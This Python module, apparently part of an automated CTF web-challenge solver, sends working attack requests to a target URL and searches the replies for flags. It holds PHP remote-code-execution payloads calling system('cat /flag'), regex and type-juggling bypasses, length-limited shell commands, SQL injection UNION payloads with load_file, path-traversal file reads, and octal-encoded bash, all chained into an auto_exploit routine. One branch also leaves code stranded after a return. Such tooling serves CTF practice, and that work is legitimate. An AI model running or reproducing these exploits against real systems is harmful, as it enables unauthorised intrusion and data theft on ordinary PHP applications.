# -*- coding: utf-8 -*-
"""url_analyzer._attacks -- Concrete exploit attempts: PHP bypass, LFI/SQLi extraction, bashFuck, auto_exploit.

从 yang_web/core/url_analyzer.py 机械拆分而来, 逐行搬运, 行为等价。
"""

from urllib.parse import urlparse, parse_qs, unquote, urlencode, urlunparse, quote
from urllib.request import Request, urlopen
from typing import List, Dict, Tuple, Optional, Callable
import re
import time
import html as _html

from ._engines import (AdaptiveScheduler, ConcurrentEngine, execute_attack)
from ._http import (FLAG_RE, USER_AGENT, send_request)



# ============================================================================
#  PHP Dynamic Function Execution Solver (RCE-labs)
# ============================================================================

_PHP_FUNC_MAP = {
    'eval':               'echo $flag;',
    'assert':             'echo $flag;',
    'call_user_func':     '"system","cat /flag"',
    'call_user_func_array': '"system",["cat /flag"]',
    'create_function':    '"","echo $flag;}"',
    'array_map':          '"system",["cat /flag"]',
    'array_filter':       '["/flag"],"system"',
    'array_reduce':       '["/flag"],"system"',
    'usort':              '[["/flag"]],"system"',
    'preg_replace':       '"/.*/e","system(\'cat /flag\')",""',
}



def _try_php_dynamic_func(url: str, fingerprint: dict,
                          on_progress=None, on_found=None) -> Optional[Dict]:
    """Try PHP dynamic function execution challenge.

    RCE-labs pattern: session selects random dangerous PHP function,
    user must submit matching payload via POST.
    """
    source = fingerprint.get('_clean_source', '')
    if not source or 'get_fun' not in source or 'hello_ctf' not in source:
        return None

    from urllib.request import Request, urlopen, build_opener, HTTPCookieProcessor
    from urllib.parse import urlencode
    from http.cookiejar import CookieJar
    import re as _re2, html as _h

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit('php_sess', 'PHP动态执行', '建立Session...')

    try:
        jar = CookieJar()
        opener = build_opener(HTTPCookieProcessor(jar))

        # Step 1: Get random function name
        resp = opener.open(Request(f'{url}?action=',
            headers={'User-Agent': USER_AGENT}), timeout=8)
        body = resp.read().decode('utf-8', errors='replace')

        func = None
        for m in _re2.finditer(
            r'(eval|assert|call_user_func|create_function|'
            r'array_map|call_user_func_array|usort|'
            r'array_filter|array_reduce|preg_replace)', body):
            func = m.group(1)
            break

        if not func:
            return None

        _emit('php_dispatch', f'随机函数: {func}', '匹配Payload...')

        payload = _PHP_FUNC_MAP.get(func)
        if not payload:
            return None

        # Step 2: Submit with matching payload
        data = urlencode({'content': payload}).encode()
        resp2 = opener.open(Request(f'{url}?action=submit', data=data,
            headers={'User-Agent': USER_AGENT,
                     'Content-Type': 'application/x-www-form-urlencoded'}), timeout=8)
        body2 = resp2.read().decode('utf-8', errors='replace')

        # Step 3: Extract flag
        flags = FLAG_RE.findall(body2)
        if flags:
            if on_found:
                on_found(flags[0])
            _emit('flag', f'PHP\u52a8\u6001\u6267\u884c({func})', flags[0])
            return {
                'flag': flags[0],
                'vuln_confirmed': [{
                    'type': f'PHP {func}',
                    'param': 'content',
                    'payload': payload,
                }],
                'attacks_run': 1,
            }
    except Exception:
        pass

    return None



# ============================================================================
#  PHP Logic Bypass Solver (multi-step: regex+intval+sha1+assignment tricks)
# ============================================================================

def _gen_octal(cmd: str) -> str:
    """Convert command to bash octal $'\\ooo' form.
    
    Splits on spaces: each word/operator becomes a separate $'\\ooo...' block.
    Example: 'cat /flag' -> "$'\\143\\141\\164' $'\\57\\146\\154\\141\\147'"
    """
    parts = []
    for word in cmd.split(' '):
        if not word:
            continue
        bs = chr(92)
        octals = ''.join(f'{bs}{ord(c):03o}' for c in word)
        parts.append(f"$'{octals}'")
    return ' '.join(parts)



def _try_php_logic_bypass(url: str, fingerprint: dict,
                          on_progress=None, on_found=None) -> Optional[Dict]:
    """Solve multi-step PHP logic bypass challenges.

    Pattern: preg_match regex bypass + intval scientific notation +
             sha1 type-juggle + assignment-in-condition.
    """
    source = fingerprint.get('_clean_source', '')
    if not source:
        return None

    # Detect known patterns with simpler, more robust checks
    has_regex_bypass = 'preg_match' in source and '!==' in source
    has_intval_trick = 'intval' in source and bool(re.search(r'intval\s*\(.*\+\s*1\)', source))
    has_sha1_juggle = source.count('sha1(') >= 2
    has_assign_cond = bool(re.search(r"\(\$_[A-Z]+\[[^\]]+\]\s*=", source))

    score = sum([has_regex_bypass, has_intval_trick, has_sha1_juggle, has_assign_cond])
    if score < 2:
        return None

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit('php_logic', '检测到PHP逻辑绕过', f'模式匹配: {score}/4')

    from urllib.request import Request, urlopen
    from urllib.parse import urlencode

    try:
        # Extract GET/POST param names from source
        get_params = list(set(re.findall(r"\$_GET\['(\w+)'\]", source)))
        post_params_dot = list(set(re.findall(r"\$_POST\['([^']+)'\]", source)))

        if not get_params:
            return None

        # Build GET bypasses
        get_payload = {}

        # Regex bypass: find preg_match and case-bypass
        if has_regex_bypass:
            pm = re.search(r"preg_match\s*\(\s*['\"](.+?)['\"]", source)
            if pm:
                regex_str = pm.group(1)
                # Strip delimiters: /^...$/i -> ..., flags: i
                m2 = re.search(r'/(.+?)/([a-z]*)$', regex_str)
                if m2:
                    expected_val = m2.group(1)
                    flags = m2.group(2)
                    # Find nearest $_GET param to preg_match
                    nearby = source[pm.start():pm.start()+200]
                    pms = re.findall(r"\$_GET\['(\w+)'\]", nearby)
                    if pms and 'i' in flags:
                        p = pms[0]
                        # Strip regex anchors (^, $) if present
                        val = expected_val
                        if val.startswith('^'):
                            val = val[1:]
                        if val.endswith('$'):
                            val = val[:-1]
                        get_payload[p] = val.lower()
                        _emit('php_logic', f'正则绕过: {p}',
                              f'大小写: {get_payload[p][:30]}')

        # intval bypass: scientific notation
        for p in get_params:
            if has_intval_trick and p not in get_payload:
                m = re.search(r'intval\s*\(\$_GET\[[\'\"]' + re.escape(p) +
                             r"[\'\"]\]\s*\)\s*<\s*(\d+)", source)
                if m:
                    target = int(m.group(1))
                    get_payload[p] = f'{target - 1}e1'
                    _emit('php_logic', f'intval绕过: {p}',
                          f'\u79d1\u5b66\u8bb0\u6570: {get_payload[p]}')

        # Build GET query string
        get_str = urlencode(get_payload, safe='!')
        post_data = None
        post_body = None

        # sha1 juggle: send params as arrays (skip dot params)
        if has_sha1_juggle and post_params_dot:
            post_body = {}
            for pp in post_params_dot:
                if '.' in pp:
                    continue  # dot params handled below
                post_body[pp + '[]'] = '1'
                _emit('php_logic', f'sha1碰撞: {pp}', '数组trick')

        # assignment-in-condition: try with underscore variant
        if has_assign_cond:
            assign_params = re.findall(
                r"\$_POST\[['\"]([^'\"]+\.[^'\"]+)['\"]\]\s*=", source)
            for ap in assign_params:
                # PHP converts . to _ in POST keys — try underscore variant
                alt = ap.replace('.', '_')
                if post_body is None:
                    post_body = {}
                post_body[alt] = 'x'
                _emit('php_logic', f'赋值条件: {ap}',
                      f'\u70b9\u53f7\u53d8 _: {alt}')

        # Execute request
        get_url = url + '?' + get_str
        _emit('php_solve', get_url[:80], 'POST搭载...')

        headers = {'User-Agent': USER_AGENT}
        if post_body:
            data = urlencode(post_body).encode()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        else:
            data = None

        req = Request(get_url, data=data, headers=headers)
        resp = urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='replace')

        flags = FLAG_RE.findall(body)
        if flags:
            if on_found:
                on_found(flags[0])
            _emit('flag', f'PHP\u903b\u8f91\u7ed5\u8fc7', flags[0])
            return {
                'flag': flags[0],
                'vuln_confirmed': [{'type': 'PHP_LOGIC',
                                    'param': '+'.join(get_params),
                                    'payload': get_str[:80]}],
                'attacks_run': 1,
            }

    except Exception:
        pass

    return None



def _scan_static_flag(url: str, on_progress=None, on_found=None) -> Optional[Dict]:
    """Static flag scanner — find flags hidden in HTML source.
    
    Checks: HTML comments, JS variables, hidden elements, response body.
    Returns None if no flag found, else a result dict.
    """
    t0 = time.time()
    resp = send_request(url, timeout=10)
    if not resp.get('ok'):
        return None
    
    body = resp.get('body', '')
    headers_text = str(resp.get('headers', {}))
    
    # 1. HTML comments <!-- flag{...} -->
    comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
    for c in comments:
        flags = FLAG_RE.findall(c)
        if flags:
            elapsed = int((time.time() - t0) * 1000)
            if on_found:
                try:
                    on_found(flags[0])
                except Exception:
                    pass
            if on_progress:
                try:
                    on_progress('static', 'HTML注释中发现Flag', flags[0][:60])
                except Exception:
                    pass
            return {'flag': flags[0], 'vuln_confirmed': [{'type': 'STATIC', 'location': 'HTML comment'}],
                    'attacks_run': 0, 'stages': ['static_scan', 'comment'],
                    'timing_ms': elapsed}
    
    # 2. Full response body (already searched by FLAG_RE)
    flags = FLAG_RE.findall(body)
    if flags:
        elapsed = int((time.time() - t0) * 1000)
        if on_found:
            try:
                on_found(flags[0])
            except Exception:
                pass
        if on_progress:
            try:
                on_progress('static', '响应体中发现Flag', flags[0][:60])
            except Exception:
                pass
        return {'flag': flags[0], 'vuln_confirmed': [{'type': 'STATIC', 'location': 'response body'}],
                'attacks_run': 0, 'stages': ['static_scan', 'body'],
                'timing_ms': elapsed}
    
    # 3. Response headers
    flags_h = FLAG_RE.findall(headers_text)
    if flags_h:
        elapsed = int((time.time() - t0) * 1000)
        if on_found:
            try:
                on_found(flags_h[0])
            except Exception:
                pass
        return {'flag': flags_h[0], 'vuln_confirmed': [{'type': 'STATIC', 'location': 'HTTP header'}],
                'attacks_run': 0, 'stages': ['static_scan', 'header'],
                'timing_ms': elapsed}
    
    return None



def _execute_php_bypass(url: str, bypass_plan: Dict,
                       on_progress=None, on_found=None) -> Dict:
    """Execute PHP multi-layer condition bypass.
    
    Constructs GET/POST params from the bypass plan and sends the request.
    """
    t0 = time.time()
    get_params = bypass_plan.get('get_params', {})
    post_params = bypass_plan.get('post_params', {})
    
    if on_progress:
        try:
            on_progress('bypass', f'{bypass_plan.get("solved_layers",0)}/{bypass_plan.get("total_layers",0)}层', '构建绕过payload...')
        except Exception:
            pass
    
    # Build URL with GET params
    from urllib.parse import urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    get_query = dict(parse_qs(parsed.query, keep_blank_values=True))
    
    # Build POST body with manual encoding (support bracket notation)
    post_parts = []
    for key, val in post_params.items():
        if val == '__ARRAY__':
            # Array params for sha1 collision: qw->qw[]=a, yxx->yxx[]=b
            if key == '__ARRAY_PARAMS__':
                post_parts.append(('qw[]', 'a'))
                post_parts.append(('yxx[]', 'b'))
        elif val == '__ANY__':
            post_parts.append((key + '[]', 'a'))
        elif val == '__POST_DOT_KEY__':
            # Dot key bypass: send bracket notation
            post_parts.append((key, 'Happy to see you!'))
        else:
            post_parts.append((key, val))
    
    # Build URL with GET params (including bypass params)
    from urllib.parse import quote
    get_list = []
    for k, vals in get_query.items():
        for v in vals:
            get_list.append(f'{k}={quote(v, safe="")}')
    for k, v in get_params.items():
        get_list.append(f'{k}={quote(v, safe="")}')
    
    if get_list:
        full_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, '&'.join(get_list), parsed.fragment))
    else:
        full_url = url
    
    # Encode POST body
    post_body = '&'.join(f'{quote(k, safe="")}={quote(v, safe="")}' for k, v in post_parts).encode('utf-8')
    
    if on_progress:
        try:
            on_progress('bypass', '发送绕过请求', f'GET: {len(get_params)} params, POST: {len(post_parts)} params')
        except Exception:
            pass
    
    # Send request
    resp = send_request(full_url, method='POST' if post_body else 'GET',
                        post_data=post_body if post_body else None)
    
    elapsed = int((time.time() - t0) * 1000)
    
    if resp.get('ok'):
        body = resp.get('body', '')
        # Search for flag patterns
        flags = FLAG_RE.findall(body)
        if flags:
            flag = flags[0]
            if on_found:
                try:
                    on_found(flag)
                except Exception:
                    pass
            if on_progress:
                try:
                    on_progress('flag', 'FLAG!', flag[:60])
                except Exception:
                    pass
            return {
                'flag': flag,
                'vuln_confirmed': [{'type': 'PHP_BYPASS', 'method': 'GET+POST',
                                     'payload': str(get_params) + ' | ' + str(post_parts)}],
                'attacks_run': 1,
                'stages': ['php_bypass', 'flag_found'],
                'timing_ms': elapsed,
            }
        
        # No flag found, check response text
        text = _html.unescape(re.sub(r'<[^>]+>', '', body))
        idx = text.find('?>')
        text = text[idx+2:].strip() if idx > 0 else text[:200]
        if on_progress:
            try:
                on_progress('bypass', '响应', text[:80])
            except Exception:
                pass
    
    return {
        'flag': None,
        'vuln_confirmed': [],
        'attacks_run': 1,
        'stages': ['php_bypass', 'no_flag'],
        'timing_ms': elapsed,
    }



def auto_exploit(url, results, on_progress=None, on_found=None, fingerprint=None):
    """v3.0 自动解题 — 并发引擎 + 自适应调度 + 智能提权.

    Uses ConcurrentEngine for parallel attacks and AdaptiveScheduler
    for context-aware payload ordering.

    Args:
        url: Target URL
        results: Analysis results from analyze_url()
        on_progress: Callable(stage, item, status)
        on_found: Callable(flag) — fire-once flag callback
        fingerprint: SmartFingerprinter result dict (optional, for scheduling)

    Returns:
        {"flag": str or None, "vuln_confirmed": [dict],
         "attacks_run": int, "stages": [str], "timing_ms": int}
    """
    t_start = time.time()
    vuln_confirmed = []
    attacks_run = 0
    stages = []

    # ── v3.2: PHP Logic Bypass (regex+intval+sha1+assignment) ──
    fp_early = fingerprint or {'_clean_source': '', '_url': url}
    logic_result = _try_php_logic_bypass(url, fp_early, on_progress=on_progress, on_found=on_found)
    if logic_result and logic_result.get('flag'):
        logic_result['stages'] = ['php_logic_bypass']
        return logic_result

    # ── v3.1: PHP Bypass routing (only return if flag found) ──
    for r in results:
        if r.get('type') == 'PHP_BYPASS':
            bypass_plan = r.get('_bypass_plan')
            if bypass_plan:
                bp_result = _execute_php_bypass(url, bypass_plan,
                                                on_progress=on_progress,
                                                on_found=on_found)
                # v3.6fix: only short-circuit if flag actually found
                if bp_result and bp_result.get('flag'):
                    bp_result['stages'] = ['php_bypass']
                    return bp_result
                # Otherwise fall through to continue attack chain

    def _found_once(flag):
        """Ensure on_found is called exactly once."""
        if on_found and not getattr(_found_once, '_called', False):
            _found_once._called = True
            try:
                on_found(flag)
            except Exception:
                pass

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    # ── v3.6: PHP 反序列化漏洞自动检测与利用 ──
    _emit('plan', 'PHP反序列化检测', '检查unserialize()调用...')
    unserialize_result = _try_php_unserialize_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if unserialize_result and unserialize_result.get('flag'):
        unserialize_result['stages'] = ['php_unserialize']
        return unserialize_result

    # ── v3.7: PHP 文件包含漏洞自动检测与利用 ──
    _emit('plan', 'PHP文件包含检测', '检查 include/require 调用...')
    lfi_result = _try_php_lfi_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if lfi_result and lfi_result.get('flag'):
        lfi_result['stages'] = ['php_file_inclusion']
        return lfi_result

    # ── 简单命令注入直接探测 (无WAF场景, 秒杀 system($_POST[x])) ──
    _emit('plan', '简单RCE检测', '直接命令注入探测...')
    try:
        from yang_web.core.simple_cmd_rce import simple_cmd_rce as _scmdrce
        _scmdrce_result = _scmdrce(url, on_progress=lambda s, i, t: _emit(s, i, t))
        if _scmdrce_result and _scmdrce_result.get('flag'):
            if on_found:
                try:
                    on_found(_scmdrce_result['flag'])
                except Exception:
                    pass
            return {
                'flag': _scmdrce_result['flag'],
                'vuln_confirmed': [{
                    'type': 'SIMPLE_CMD_RCE',
                    'param': _scmdrce_result.get('param'),
                    'method': _scmdrce_result.get('method'),
                    'cmd': _scmdrce_result.get('cmd'),
                }],
                'attacks_run': 0,
                'stages': ['simple_cmd_rce'],
                'timing_ms': int((time.time() - t_start) * 1000),
            }
    except Exception:
        pass

    # ── v3.7: bashFuck 无字母命令执行自动检测与利用 ──
    _emit('plan', 'bashFuck检测', '检查 system/exec + WAF...')
    bf_result = _try_bashfuck_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if bf_result and bf_result.get('flag'):
        bf_result['stages'] = ['bashfuck_no_alpha_rce']
        return bf_result

    # ── v3.8: PHP MD5碰撞 + eval RCE 自动检测与利用 ──
    _emit('plan', 'PHP-EvalRCE检测', '检查 eval() + MD5碰撞 + WAF...')
    eval_rce_result = _try_php_eval_rce_exploit(
        url, results, fp_early, on_progress=on_progress, on_found=on_found)
    if eval_rce_result and eval_rce_result.get('flag'):
        eval_rce_result['stages'] = ['php_eval_rce']
        return eval_rce_result

    # ── v3.7: SSRF DNS Rebinding → RCE ──
    _emit('plan', 'SSRF-Rebind检测', '检查 gethostbyname + popen...')
    from yang_web.core.ssrf_rebind import auto_solve as sr_auto_solve
    sr_result = sr_auto_solve(url, on_progress=lambda s,i,t: _emit(s,i,t))
    if sr_result and sr_result.get('flag'):
        if on_found:
            try: on_found(sr_result['flag'])
            except Exception: pass
        return {
            'flag': sr_result['flag'],
            'stages': ['ssrf_dns_rebind'],
            'vuln_confirmed': [{'type': 'SSRF_DNS_REBIND_RCE',
                                 'bypass': sr_result.get('bypass')}],
        }

    # ── Phase 1: Build adaptive attack plan ──
    _emit('plan', '构建攻击计划', '智能调度中...')

    # Use fingerprint if available, otherwise create a minimal one
    fp = fingerprint or {'php_vulns': [], 'php_params': [], 'waf': None,
                          'cms': 'Unknown', 'cms_confidence': 0,
                          'tech_stack': [], '_url': url}
    if '_url' not in fp:
        fp['_url'] = url

    scheduler = AdaptiveScheduler()
    tasks = scheduler.schedule(results, fp)

    if tasks:
        _emit('plan', f'攻击计划就绪', f'{len(tasks)} 个任务 | 优先: {tasks[0].get("payload_def",{}).get("name","?")}')

        # ── Phase 2: Concurrent attack batch ──
        _emit('attack', '并发攻击启动', f'{len(tasks)} 任务 × {min(15, len(tasks))} 并发')
        stages.append('concurrent_attack')

        engine = ConcurrentEngine(max_workers=15, timeout=5, retries=2)

        # Track results from batch execution
        batch_results, engine_flag = engine.attack_batch(
            tasks,
            on_progress=lambda stage, item, status: _emit(stage, item, status),
            on_flag=lambda f: _found_once(f))

        attacks_run = len(batch_results)

        # Check engine-returned flag first
        if engine_flag:
            _found_once(engine_flag)
            timing = int((time.time() - t_start) * 1000)
            return {
                'flag': engine_flag,
                'flag_found_by': 'concurrent_engine',
                'vuln_confirmed': vuln_confirmed,
                'attacks_run': attacks_run,
                'stages': stages + ['flag_in_batch'],
                'timing_ms': timing,
            }

            # Collect confirmed vulns from batch results
            for res in batch_results:
                analysis = res.get('analysis', {})
                if analysis.get('success'):
                    vuln_confirmed.append({
                        'type': res.get('payload_name', '?'),
                        'param': res.get('param', '?'),
                        'payload': res.get('payload_name', '?'),
                        'evidence': analysis.get('detail', '')[:120],
                    })

        _emit('attack', f'攻击完成', f'{attacks_run} 次 | 确认 {len(vuln_confirmed)} 漏洞')
    else:
        _emit('plan', '无攻击目标', '跳过并发攻击，直接扫描...')
        attacks_run = 0

    timing = int((time.time() - t_start) * 1000)
    
    # Fallback: scan HTML source for hidden flags
    _emit('post', '扫描静态资源', '检查HTML注释/响应体...')
    static_result = _scan_static_flag(url, on_progress=on_progress, on_found=on_found)
    if static_result and static_result.get('flag'):
        static_result['stages'] = stages + ['static_scan_fallback']
        return static_result
    
    # v3.1: PHP dynamic function execution challenge
    _emit('post', '检测PHP动态执行', '尝试session+POST...')
    php_result = _try_php_dynamic_func(url, fp, on_progress=on_progress, on_found=on_found)
    if php_result and php_result.get('flag'):
        php_result['stages'] = stages + ['php_dynamic_func']
        return php_result

    # v3.3: bashFuck 无字母命令执行检测 (二进制替换绕过WAF)
    _emit('post', 'bashFuck检测', '检测无字母数字WAF...')
    bf_result = _try_bashfuck_exploit(url, results, fp, on_progress=on_progress, on_found=on_found)
    if bf_result and bf_result.get('flag'):
        bf_result['stages'] = stages + ['bashfuck_rce']
        return bf_result
    
    # v3.5: 长度限制 RCE (7字符限制 + 数字参数名 $_GET[1])
    _emit('post', '长度限制RCE', '探测数字参数名+长度上限...')
    len_result = _try_length_limit_rce_exploit(url, results, fp, on_progress=on_progress, on_found=on_found)
    if len_result and len_result.get('flag'):
        len_result['stages'] = stages + ['length_limit_rce']
        return len_result

    return {
        'flag': None,
        'vuln_confirmed': vuln_confirmed,
        'attacks_run': attacks_run,
        'stages': stages + ['completed'],
        'timing_ms': timing,
    }


def _try_length_limit_rce_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """v3.5: 长度限制 RCE — 7字符限制 + 数字参数名 ($_GET[1]).

    针对 strlen($_GET[p]) < N 的 PHP RCE 题型。
    核心逻辑: 探测数字参数名 → 二分找长度上限 → 短命令读flag.
    """
    import re as _bf_re
    try:
        from ..smart_solver import http_get, decode_body, _detect_php_source, find_flag
    except ImportError:
        try:
            from yang_web.core.smart_solver import http_get, decode_body, _detect_php_source, find_flag
        except ImportError:
            return None
    
    def _emit(stage, item, status):
        if on_progress:
            try: on_progress(stage, item, status)
            except Exception: pass
    
    def _found(flag):
        if on_found and not getattr(_found, '_called', False):
            _found._called = True
            try: on_found(flag)
            except Exception: pass
    
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    
    _emit('len_rce', '参数探测', '尝试数字参数名 0-9...')
    
    # Step 1: 探测数字参数名 (0-9)
    for pnum in range(10):
        pname = str(pnum)
        code, body, _ = http_get(f"{base}?{pname}=1", timeout=5)
        if not body:
            continue
        text = decode_body(body)
        if not _detect_php_source(text):
            continue
        
        _emit('len_rce', '找到参数', f"param={pname}")
        
        # Step 2: 二分查找最大长度
        def _passes(length):
            url_m = base + '?' + pname + '=' + ('A' * length)
            _, body_m, _ = http_get(url_m, timeout=5)
            return _detect_php_source(decode_body(body_m))
        
        if _passes(20):
            max_len = 20
        elif _passes(7):
            lo, hi = 7, 20
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _passes(mid): lo = mid
                else: hi = mid - 1
            max_len = lo
        else:
            lo, hi = 1, 7
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if _passes(mid): lo = mid
                else: hi = mid - 1
            max_len = lo
        
        if max_len < 2:
            continue
        _emit('len_rce', '长度上限', f"max={max_len} chars")
        
        # Step 3: 短命令 payload 库
        short_cmds = [
            (6, 'nl /f*'), (7, 'tac /f*'), (6, 'od /f*'),
            (7, 'nl /*f*'), (7, 'od /*f*'), (7, 'rev /f*'),
            (4, 'ls /'), (6, 'nl /h*'), (6, 'nl /r*'), (6, 'nl /t*'),
            (5, 'nl *'), (6, 'tac *'),
        ]
        
        tried = set()
        for pay_len, cmd in short_cmds:
            if pay_len > max_len or cmd in tried:
                continue
            tried.add(cmd)
            
            try:
                code, body, _ = http_get(f"{base}?{pname}={quote(cmd)}", timeout=8)
                text = decode_body(body)
                
                # 提取命令输出（剥离 PHP 源码）
                clean = _bf_re.sub(r'<[^>]+>', '', text)
                clean = clean.replace('&lt;','<').replace('&gt;','>').replace('&nbsp;',' ').replace('&amp;','&')
                out_lines = []
                for l in clean.split('\n'):
                    if '<?php' in l or 'function ' in l or 'preg_match' in l or 'highlight_file' in l:
                        break
                    s = l.strip()
                    if s: out_lines.append(s)
                output_text = '\n'.join(out_lines)
                
                # 搜 flag
                search = output_text if output_text else text
                f = find_flag(search)
                if f:
                    _emit('len_rce', 'FLAG!', f"cmd={cmd}")
                    _found(f)
                    return {'flag': f, 'vuln_confirmed': [
                        {'type': 'length_limit_rce', 'param': pname, 'cmd': cmd}
                    ], 'attacks_run': len(tried), 'timing_ms': 0}
                
                if out_lines:
                    _emit('len_rce', '命令输出', f"{cmd}: {' '.join(out_lines[:2])[:100]}")
            except Exception:
                continue
        break  # Found working param, no need to try more
    
    _emit('len_rce', '完成', '无长度限制RCE发现')
    return None



# Keep old helper functions for backward compatibility
# (ConcurrentEngine now handles flag paths internally via AdaptiveScheduler)
def _try_flag_paths(url, param, on_progress=None):
    """Deprecated: Use ConcurrentEngine + AdaptiveScheduler instead."""
    # Simplified fallback for old code paths
    for cmd in ['cat /flag', 'cat /fla*', 'cat flag.txt', 'cat /f*']:
        try:
            res = execute_attack(url, param, {
                'name': f'flag:{cmd}', 'payload': cmd,
                'method': 'replace', 'detect': 'content',
                'match': ['flag{', 'CTF{', 'ISCC{'],
            }, timeout=2)
            body = res.get('response', {}).get('body', '')
            flags = FLAG_RE.findall(body)
            if flags:
                if on_progress:
                    on_progress('flag_path', cmd, 'FLAG!')
                return flags[0]
        except Exception:
            pass
    return None



def _try_sqli_extract(url, param, on_progress=None):
    """Deprecated: SQLi extraction, kept for backward compat."""
    for ext in [
        "' UNION SELECT 1,flag,3 FROM flag-- ",
        "' UNION SELECT 1,group_concat(flag),3 FROM flag-- ",
        "' UNION SELECT 1,database(),3-- ",
        "' UNION SELECT 1,load_file('/flag'),3-- ",
    ]:
        try:
            res = execute_attack(url, param, {
                'name': 'sqli_extract', 'payload': ext,
                'method': 'append', 'detect': 'content', 'match': []})
            body = res.get('response', {}).get('body', '')
            flags = FLAG_RE.findall(body)
            if flags:
                return flags[0]
        except Exception:
            pass
    return None



def _try_lfi_flag(url, param, on_progress=None):
    """Deprecated: LFI flag read, kept for backward compat."""
    for path in ['../../../flag', '../../flag', 'flag', 'flag.php', 'flag.txt']:
        try:
            res = execute_attack(url, param, {
                'name': f'LFI {path}', 'payload': path,
                'method': 'replace', 'detect': 'content',
                'match': ['flag{', 'CTF{', 'ISCC{']})
            body = res.get('response', {}).get('body', '')
            flags = FLAG_RE.findall(body)
            if flags:
                return flags[0]
        except Exception:
            pass
    return None



# ============================================================================
#  Attack Guides
# ============================================================================

def _try_php_unserialize_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """v3.6: PHP 反序列化漏洞自动求解 — 委托给 php_unserialize 模块.
    
    支持的题型变体:
        - 基础验证 (class 属性对比)
        - __wakeup 绕过 (CVE-2016-7124)
        - == 弱类型绕过 (bool/int)
        - private/protected 属性编码
        - 简单 POP 链 (__destruct → 危险函数)
    """
    try:
        from ..php_unserialize import auto_solve
    except ImportError:
        from yang_web.core.php_unserialize import auto_solve

    return auto_solve(url, on_progress=on_progress, on_found=on_found)


# ═══════════════════════════════════════════════════════════
#  PHP File Inclusion General Solver (v3.7)
# ═══════════════════════════════════════════════════════════

def _try_php_lfi_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """PHP 文件包含漏洞自动检测 — 委托给 php_lfi 通用引擎."""
    from yang_web.core.php_lfi import auto_solve as lfi_auto_solve

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit('php_lfi', 'running', 'php_lfi 通用求解器 v1.0')

    result = lfi_auto_solve(url, on_progress=_emit)
    if result and result.get('flag'):
        if on_found:
            try:
                on_found(result['flag'])
            except Exception:
                pass
        return {
            'flag': result['flag'],
            'vuln_confirmed': [{
                'type': 'PHP_FILE_INCLUSION',
                'param': result.get('param'),
                'path': result.get('path'),
                'strategy': result.get('strategy'),
            }],
        }
    return None



# ═══════════════════════════════════════════════════════════
#  PHP MD5 Collision + eval RCE (v3.8)
# ═══════════════════════════════════════════════════════════

def _try_php_eval_rce_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """PHP MD5 碰撞 + eval() RCE 自动检测与利用.
    
    薄包装，委托给 php_eval_rce 通用引擎.
    """
    def _progress(msg):
        if on_progress:
            on_progress('PHP-EvalRCE', msg, '')
    
    from yang_web.core.php_eval_rce import auto_solve as eval_auto_solve
    result = eval_auto_solve(url, on_progress=_progress)
    
    if result and result.get('flag'):
        if on_found:
            on_found('PHP-EvalRCE', result['flag'], result)
        return {
            'flag': result['flag'],
            'success': True,
            'stages': ['php_eval_rce'],
            'findings': [{
                'type': 'php_eval_rce',
                'strategy': result.get('strategy'),
                'status': result.get('status'),
            }],
        }
    return None



# ═══════════════════════════════════════════════════════════
#  bashFuck No-Alpha Command Execution (v3.7)
# ═══════════════════════════════════════════════════════════

def _try_bashfuck_exploit(url, results, fingerprint, on_progress=None, on_found=None):
    """bashFuck no-alpha RCE auto solver -- delegates to bashfuck_solver."""
    from yang_web.core.bashfuck_solver import auto_solve as bf_auto_solve

    def _emit(stage, item, status):
        if on_progress:
            try:
                on_progress(stage, item, status)
            except Exception:
                pass

    _emit("bashFuck", "running", "bashfuck_solver v1.0")

    result = bf_auto_solve(url, on_progress=_emit)
    if result and result.get("flag"):
        if on_found:
            try:
                on_found(result["flag"])
            except Exception:
                pass
        return {
            "flag": result["flag"],
            "vuln_confirmed": [{
                "type": "BASHFUCK_NO_ALPHA_RCE",
                "param": result.get("param"),
                "method": result.get("method"),
                "form": result.get("form"),
            }],
        }
    return None
